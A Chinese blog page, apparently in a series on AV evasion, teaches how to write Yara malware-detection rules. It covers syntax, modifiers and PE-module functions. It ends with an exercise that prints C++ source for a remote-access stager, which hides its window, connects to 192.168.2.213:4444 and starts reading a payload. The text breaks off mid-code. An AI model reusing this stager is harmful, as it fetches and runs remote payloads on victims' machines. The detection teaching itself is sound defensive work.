@@ -1,0 +1,415 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>[免杀学习]Yara规则学习 | Lanb0's blog|一个默默无闻的网安爱好者</title><meta name="author" content="lanb0"><meta name="copyright" content="lanb0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Yara简介yara规则是一种用于描述恶意软件样本特征的语言，它由三个主要部分组成：规则名称、元数据和条件。 yara规则由三个主要部分组成：规则名称、元数据和条件。  规则名称是一个唯一的标识符，用于描述规则的目的或匹配的样本类型。 元数据是一些键值对，用于提供规则的额外信息，如作者、日期、描述、引用等。 条件是一个布尔表达式，用于定义规则匹配的逻辑，它通常包含一些字符串或模块函数。  yara">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[免杀学习]Yara规则学习">
+<meta property="og:url" content="https://wustzhb.github.io/2023/08/28/[%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0]Yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Lanb0&#39;s blog|一个默默无闻的网安爱好者">
+<meta property="og:description" content="Yara简介yara规则是一种用于描述恶意软件样本特征的语言，它由三个主要部分组成：规则名称、元数据和条件。 yara规则由三个主要部分组成：规则名称、元数据和条件。  规则名称是一个唯一的标识符，用于描述规则的目的或匹配的样本类型。 元数据是一些键值对，用于提供规则的额外信息，如作者、日期、描述、引用等。 条件是一个布尔表达式，用于定义规则匹配的逻辑，它通常包含一些字符串或模块函数。  yara">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wustzhb.github.io/img/head.jpg">
+<meta property="article:published_time" content="2023-08-28T04:41:00.000Z">
+<meta property="article:modified_time" content="2023-09-05T05:15:57.361Z">
+<meta property="article:author" content="lanb0">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="yara规则">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wustzhb.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://wustzhb.github.io/2023/08/28/[%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0]Yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[免杀学习]Yara规则学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-05 13:15:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">46</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Lanb0's blog|一个默默无闻的网安爱好者"><span class="site-name">Lanb0's blog|一个默默无闻的网安爱好者</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">[免杀学习]Yara规则学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-28T04:41:00.000Z" title="发表于 2023-08-28 12:41:00">2023-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-05T05:15:57.361Z" title="更新于 2023-09-05 13:15:57">2023-09-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/">免杀系列</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/Yara/">Yara</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Yara简介"><a href="#Yara简介" class="headerlink" title="Yara简介"></a>Yara简介</h1><p>yara规则是一种用于描述恶意软件样本特征的语言，它由三个主要部分组成：规则名称、元数据和条件。</p>
+<p>yara规则由三个主要部分组成：<strong>规则名称</strong>、<strong>元数据</strong>和<strong>条件</strong>。</p>
+<ol>
+<li>规则名称是一个<strong>唯一</strong>的标识符，用于描述规则的目的或匹配的样本类型。</li>
+<li>元数据是一些<strong>键值对</strong>，用于提供规则的额外信息，如作者、日期、描述、引用等。</li>
+<li>条件是一个<strong>布尔表达式</strong>，用于定义规则匹配的逻辑，它通常包含一些字符串或模块函数。</li>
+</ol>
+<p>yara规则的基本语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule &lt;name&gt; &#123;</span><br><span class="line">    meta:</span><br><span class="line">        &lt;key&gt; = &lt;value&gt;</span><br><span class="line">        ...</span><br><span class="line">    strings:</span><br><span class="line">        $&lt;name&gt; = &quot;&lt;string&gt;&quot;</span><br><span class="line">        ...</span><br><span class="line">    condition:</span><br><span class="line">        &lt;expression&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Yara编写-x2F-使用"><a href="#Yara编写-x2F-使用" class="headerlink" title="Yara编写&#x2F;使用"></a>Yara编写&#x2F;使用</h1><p>环境:python</p>
+<p><strong>下载python的yara依赖</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install yara-python</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>创建一个txt文件，里面写入一些内容</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;I am Lanb0&#x27; &gt; test.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>写入以下代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yara</span><br><span class="line">rule_str=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rule match_lanb0 &#123;</span></span><br><span class="line"><span class="string">    meta:</span></span><br><span class="line"><span class="string">        author = &quot;Lanb0&quot;</span></span><br><span class="line"><span class="string">        date = &quot;2023-08-28&quot;</span></span><br><span class="line"><span class="string">        description = &quot;A rule to match files containing Lanb0&quot;</span></span><br><span class="line"><span class="string">    strings:</span></span><br><span class="line"><span class="string">        $flag = &quot;Lanb0&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    condition:</span></span><br><span class="line"><span class="string">        $flag</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rule = yara.<span class="built_in">compile</span>(source=rule_str)</span><br><span class="line">matches = rule.<span class="keyword">match</span>(<span class="string">&#x27;test.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>匹配到会显示规则名称:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[match_lanb0]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><p>yara规则中的字符串默认是ASCII字符串，它只能匹配ASCII编码的文件，如果要匹配其他编码的文件，如Unicode，需要在字符串后加上<code>wide</code>修饰符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;Lanb0&quot; wide</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="语法-x2F-修饰符总结"><a href="#语法-x2F-修饰符总结" class="headerlink" title="语法&#x2F;修饰符总结"></a>语法&#x2F;修饰符总结</h2><h3 id="strings块"><a href="#strings块" class="headerlink" title="strings块"></a>strings块</h3><p>YARA规则中的strings是用来定义软件中可能出现的字符串或者字节序列，它们可以是文本字符串，十六进制字符串，或者正则表达式字符串。</p>
+<table>
+<thead>
+<tr>
+<th>修饰符</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fullword</td>
+<td>表示严格匹配完整的单词，即字符串的前后不能有字母、数字或下划线。</td>
+</tr>
+<tr>
+<td>wide</td>
+<td>表示匹配宽字节字符串(Unicode)</td>
+</tr>
+<tr>
+<td>ascii</td>
+<td>表示匹配ASCII字符</td>
+</tr>
+<tr>
+<td>nocase</td>
+<td>表示忽略字符串的大小写</td>
+</tr>
+<tr>
+<td>{}</td>
+<td>表示一个十六进制字符串</td>
+</tr>
+<tr>
+<td>?</td>
+<td>表示通配符，可以匹配任意一个hex字符。(在{}中使用)</td>
+</tr>
+<tr>
+<td>()</td>
+<td>表示可选的字节序列，可以使用|表示”或”。(在{}中使用)</td>
+</tr>
+<tr>
+<td>[]</td>
+<td>表示任意填充的字节数，可以指定一个范围。(在{}中使用)</td>
+</tr>
+<tr>
+<td>&#x2F;&#x2F;</td>
+<td>表示要使用正则表达式</td>
+</tr>
+</tbody></table>
+<p><strong>注意:在strings块中声明的每个变量都必须在condition块中被使用，否则会报错unreferenced string “$xxx”</strong></p>
+<h3 id="condition块"><a href="#condition块" class="headerlink" title="condition块"></a>condition块</h3><h4 id="uint"><a href="#uint" class="headerlink" title="uint"></a>uint</h4><p>uint是一个函数用法，它表示读取文件中指定位置的字节，并转换为无符号整数。</p>
+<p><strong>uint16(0)</strong> 表示读取文件开头(第0索引)的两个字节，并转换为无符号整数。</p>
+<p>例如，如果文件开头的两个字节是 4D 5A，那么 uint16(0) 的值就是 0x5A4D(小端序)。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">condition:</span><br><span class="line">	uint16(0) == 0x5A4D</span><br></pre></td></tr></table></figure>
+
+<p>这个函数可以用于检查文件的类型，例如 uint16(0) &#x3D;&#x3D; 0x5A4D 就是检查文件是否是 Windows 可执行文件。</p>
+<p>**uint32(0)**同理</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>#修饰符是用来判断变量出现次数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strings:</span><br><span class="line">	$flag=&#123;4D 5A&#125;</span><br><span class="line">condition:</span><br><span class="line">	#flag &gt; 1</span><br></pre></td></tr></table></figure>
+
+<p>这里就是判断4D 5A这个字节序列是否出现了1次以上</p>
+<h4 id="filesize"><a href="#filesize" class="headerlink" title="filesize"></a>filesize</h4><p>filesize表示文件大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">condition:</span><br><span class="line">    filesize&gt;1024</span><br></pre></td></tr></table></figure>
+
+<p>也可以用KB,MB来自动换算，但必须是大写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">condition:</span><br><span class="line">    filesize&gt;1KB</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="of"><a href="#of" class="headerlink" title="of"></a>of</h4><p>… of ….语法用来表示在一个范围中匹配一个，两个或者多个甚至全部</p>
+<p>例如</p>
+<p><code>all of them</code> 表示所有声明的变量都匹配时，条件成立。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">strings:</span><br><span class="line">    $a=&quot;I&quot;</span><br><span class="line">    $b=&quot;am&quot;</span><br><span class="line">    $c=&quot;Lanb0&quot;</span><br><span class="line"></span><br><span class="line">condition:</span><br><span class="line">    all of them</span><br></pre></td></tr></table></figure>
+
+<p><code>any of them</code>表示任意一个声明的变量匹配时，条件成立。</p>
+<blockquote>
+<p>them表示在strings块中声明的所有的变量</p>
+</blockquote>
+<p>of的左边可以换成任意正整数，右边也可以换成特定范围的变量,用括号包裹起来即可</p>
+<ul>
+<li>1 of ($a,$b),表示匹配到$a或者$b任何一个变量时，条件成立</li>
+<li>all of ($a,$b),表示匹配到$a和$b，即包含了全部括号中的变量时，条件城里</li>
+<li>any of ($a,$b)与第一条规则效果相同</li>
+</ul>
+<h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>not表示某个字符串不匹配时，条件成立。</p>
+<p>例如</p>
+<p><code>not $b</code> 表示$b不匹配时，条件成立。</p>
+<h4 id="and"><a href="#and" class="headerlink" title="and"></a>and</h4><p>and表示左右两个条件都成立时，条件成立</p>
+<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><p>or表示任意一个条件成立时，条件成立</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="*"></a>*</h4><p>*代表<strong>通配符</strong>，以如下规则为例，表示是匹配<strong>变量名</strong>以‘a’开头的任意变量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">strings:</span><br><span class="line">   </span><br><span class="line">    $a1=&quot;I&quot;</span><br><span class="line">    $a2=&quot;am&quot;</span><br><span class="line">    $a3=&quot;Lanb0&quot;</span><br><span class="line"></span><br><span class="line">condition:</span><br><span class="line">    all of ($a*)</span><br></pre></td></tr></table></figure>
+
+<p>注意,以下写法是错误的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">condition:</span><br><span class="line">    $a*</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="库"><a href="#库" class="headerlink" title="库"></a>库</h2><p>可以导入写好的库来使用库函数进行匹配</p>
+<p>比如PE库，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import &quot;pe&quot;</span><br><span class="line">//判断文件是否为dll文件</span><br><span class="line">rule is_dll &#123;</span><br><span class="line">  condition:</span><br><span class="line">    pe.is_dll()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="一些常用的PE库函数"><a href="#一些常用的PE库函数" class="headerlink" title="一些常用的PE库函数"></a>一些常用的PE库函数</h3><table>
+<thead>
+<tr>
+<th align="left">pe方法</th>
+<th align="left">说明</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">pe.is_dll()</td>
+<td align="left">判断文件是否是DLL文件</td>
+<td align="left"><code>condition: pe.is_dll</code></td>
+</tr>
+<tr>
+<td align="left">pe.is_32bit()</td>
+<td align="left">判断文件是否是32位PE文件</td>
+<td align="left"><code>condition: pe.is_32bit</code></td>
+</tr>
+<tr>
+<td align="left">pe.is_64bit()</td>
+<td align="left">判断文件是否是64位PE文件</td>
+<td align="left"><code>condition: pe.is_64bit</code></td>
+</tr>
+<tr>
+<td align="left">pe.number_of_sections</td>
+<td align="left">获取文件的节区数量</td>
+<td align="left"><code>condition: pe.number_of_sections &gt; 5</code></td>
+</tr>
+<tr>
+<td align="left">pe.sections[i]</td>
+<td align="left">获取第i个节区的信息，如名称、大小、虚拟地址等</td>
+<td align="left"><code>condition: pe.sections[0].name == &quot;.text&quot;</code></td>
+</tr>
+<tr>
+<td align="left">pe.entry_point</td>
+<td align="left">获取文件的入口点地址</td>
+<td align="left"><code>condition: pe.entry_point == 0x401000</code></td>
+</tr>
+<tr>
+<td align="left">pe.imports(library, function)</td>
+<td align="left">判断文件是否导入了指定的库和函数</td>
+<td align="left"><code>condition: pe.imports(&quot;kernel32.dll&quot;, &quot;CreateFileA&quot;)</code></td>
+</tr>
+<tr>
+<td align="left">pe.number_of_imports</td>
+<td align="left">获取文件导入的函数数量</td>
+<td align="left"><code>condition: pe.number_of_imports &gt; 10</code></td>
+</tr>
+<tr>
+<td align="left">pe.imports[i]</td>
+<td align="left">获取第i个导入的函数的信息，如库名、函数名等</td>
+<td align="left"><code>condition: pe.imports[0].library == &quot;kernel32.dll&quot;</code></td>
+</tr>
+<tr>
+<td align="left">pe.exports(function)</td>
+<td align="left">判断文件是否导出了指定的函数</td>
+<td align="left"><code>condition: pe.exports(&quot;DllRegisterServer&quot;)</code></td>
+</tr>
+<tr>
+<td align="left">pe.number_of_exports</td>
+<td align="left">获取文件导出的函数数量</td>
+<td align="left"><code>condition: pe.number_of_exports &gt; 0</code></td>
+</tr>
+<tr>
+<td align="left">pe.exports[i]</td>
+<td align="left">获取第i个导出的函数的信息，如名称、地址等</td>
+<td align="left"><code>condition: pe.exports[0].name == &quot;DllRegisterServer&quot;</code></td>
+</tr>
+<tr>
+<td align="left">pe.resources[i]</td>
+<td align="left">获取第i个资源的信息，如类型、名称、语言等</td>
+<td align="left"><code>condition: pe.resources[0].type == &quot;RT_ICON&quot;</code></td>
+</tr>
+<tr>
+<td align="left">pe.number_of_resources</td>
+<td align="left">获取文件资源的数量</td>
+<td align="left"><code>condition: pe.number_of_resources &gt; 1</code></td>
+</tr>
+<tr>
+<td align="left">pe.version_info[key]</td>
+<td align="left">获取文件版本信息中指定键的值，如CompanyName, FileVersion等</td>
+<td align="left"><code>condition: pe.version_info[&quot;CompanyName&quot;] == &quot;Microsoft Corporation&quot;</code></td>
+</tr>
+<tr>
+<td align="left">pe.checksum</td>
+<td align="left">获取文件校验和</td>
+<td align="left"><code>condition: pe.checksum == 0x12345678</code></td>
+</tr>
+<tr>
+<td align="left">pe.imphash()</td>
+<td align="left">获取文件导入表哈希值</td>
+<td align="left"><code>condition: pe.imphash() == &quot;f34d5f2d4577ed6d9ceec516c1f5a744&quot;</code></td>
+</tr>
+</tbody></table>
+<h1 id="训练-用Yara规则写一个远控检测"><a href="#训练-用Yara规则写一个远控检测" class="headerlink" title="训练:用Yara规则写一个远控检测"></a>训练:用Yara规则写一个远控检测</h1><p>要求:</p>
+<ol>
+<li>误杀率低</li>
+</ol>
+<h2 id="样本源码"><a href="#样本源码" class="headerlink" title="样本源码"></a>样本源码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span> (disable: 4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WS2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ShowWindow</span>(<span class="built_in">GetForegroundWindow</span>(), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//分配socket资源</span></span><br><span class="line">    WSADATA wsData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsData))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartp fail.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请socket，并链接</span></span><br><span class="line">    SOCKET sock = <span class="built_in">WSASocket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    SOCKADDR_IN server;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;server, <span class="built_in">sizeof</span>(SOCKADDR_IN));</span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.2.213&quot;</span>); <span class="comment">//server ip</span></span><br><span class="line">    server.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>); <span class="comment">//server port</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sock, (SOCKADDR*)&amp;server, <span class="built_in">sizeof</span>(server)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect to server fail.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> Fail;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//接收长度</span></span><br><span class="line">    u_int payloadLen;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">recv</span>(sock, (<span class="type">char</span>*)&amp;payloadLen, <span class="built_in">sizeof</span>(payloadLen), <span class="number">0</span>) != <span class="built_in">sizeof</span>(payloadLen))</span><br><span class="line">    